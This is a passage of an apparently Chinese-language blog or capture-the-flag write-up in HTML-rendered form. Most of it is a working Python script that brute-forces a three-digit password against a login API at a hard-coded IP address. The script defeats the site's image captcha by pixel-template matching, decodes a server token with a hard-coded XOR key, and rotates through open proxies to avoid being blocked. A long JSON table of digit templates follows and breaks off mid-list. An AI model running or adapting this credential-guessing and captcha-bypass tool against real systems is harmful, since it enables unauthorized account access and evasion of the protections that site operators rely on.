class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.107.251.41/api/"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyPool</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.pool = [</span><br><span class="line">            <span class="string">"127.0.0.1:4780"</span>,</span><br><span class="line">            <span class="string">"223.241.7.181:3000"</span>,</span><br><span class="line">            <span class="string">"222.189.190.254:9999"</span>,</span><br><span class="line">            <span class="string">"223.242.224.147:9999"</span>,</span><br><span class="line">            <span class="string">"36.248.129.32:9999"</span>,</span><br><span class="line">            <span class="string">"27.43.189.11:9999"</span>,</span><br><span class="line">            <span class="string">"103.140.204.1:8080"</span>,</span><br><span class="line">            <span class="string">"36.249.53.38:8000"</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_proxy</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">'http'</span>: <span class="string">'http://'</span> + self.pool[<span class="number">0</span>]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">del_ip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">del</span> self.pool[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_str</span><span class="params">(num_list)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"num_data.json"</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        nums = json.loads(f.read())</span><br><span class="line">    sim_data = []</span><br><span class="line">    <span class="keyword">for</span> num, num_data <span class="keyword">in</span> nums.items():</span><br><span class="line">        sim = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ii, jj <span class="keyword">in</span> zip(num_list, num_data):</span><br><span class="line">            <span class="keyword">if</span> ii == jj:</span><br><span class="line">                sim += <span class="number">1</span></span><br><span class="line">        sim_data.append(sim)</span><br><span class="line">    <span class="keyword">return</span> str(sim_data.index(max(sim_data)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_img</span><span class="params">(img)</span>:</span></span><br><span class="line">    s = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        offset = i * <span class="number">15</span> + <span class="number">5</span></span><br><span class="line">        data = img.crop((offset, <span class="number">3</span>, offset + <span class="number">12</span>, <span class="number">20</span>))</span><br><span class="line">        data = data.convert(<span class="string">"L"</span>)</span><br><span class="line">        w, h = data.size</span><br><span class="line">        pixdata = data.load()</span><br><span class="line">        img_data = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(w):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(h):</span><br><span class="line">                img_data.append(<span class="number">0</span> <span class="keyword">if</span> pixdata[x, y] &lt; <span class="number">255</span> <span class="keyword">else</span> <span class="number">255</span>)</span><br><span class="line">        s += find_str(img_data)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(password, proxy)</span>:</span></span><br><span class="line">    data = requests.get(url=url).json()</span><br><span class="line">    code = <span class="string">""</span></span><br><span class="line">    uuid = parse_uuid(data[<span class="string">"uuid"</span>])</span><br><span class="line">    image = data[<span class="string">"img"</span>]</span><br><span class="line">    <span class="keyword">if</span> len(image) &gt; <span class="number">0</span>:</span><br><span class="line">        bytes_io = BytesIO(base64.b64decode(image[len(<span class="string">"data:image/png;base64,"</span>):]))</span><br><span class="line">        img = Image.open(bytes_io)</span><br><span class="line">        code = load_img(img)</span><br><span class="line"></span><br><span class="line">    data = requests.post(url=url, data=&#123;<span class="string">"uuid"</span>: uuid, <span class="string">"code"</span>: code, <span class="string">"password"</span>: password&#125;, proxies=proxy, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> data.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"404"</span>)</span><br><span class="line">    <span class="keyword">return</span> data.json()[<span class="string">"result"</span>], data.json()[<span class="string">"msg"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_uuid</span><span class="params">(raw)</span>:</span></span><br><span class="line">    input_raw = list(base64.b64decode(raw))</span><br><span class="line">    key = [<span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">69</span>, <span class="number">53</span>, <span class="number">69</span>, <span class="number">56</span>, <span class="number">55</span>, <span class="number">53</span>, <span class="number">70</span>, <span class="number">66</span>, <span class="number">70</span>, <span class="number">48</span>, <span class="number">69</span>,</span><br><span class="line">           <span class="number">69</span>, <span class="number">69</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">56</span>, <span class="number">51</span>, <span class="number">70</span>, <span class="number">56</span>, <span class="number">65</span>, <span class="number">70</span>, <span class="number">51</span>, <span class="number">68</span>, <span class="number">68</span>, <span class="number">70</span>, <span class="number">70</span>, <span class="number">57</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(input_raw)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(key)):</span><br><span class="line">            input_raw[i] ^= key[j]</span><br><span class="line">    <span class="keyword">return</span> bytes(input_raw).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ProxyPool()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(i, foo(i, pool.get_proxy()))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        pool.del_ip()</span><br></pre></td></tr></table></figure><h5 id="特征点"><a href="#特征点" class="headerlink" title="特征点"></a>特征点</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"0"</span>: [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"1"</span>: [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"2"</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>], <span class="attr">"3"</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>], <span class="attr">"4"</span>: [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span 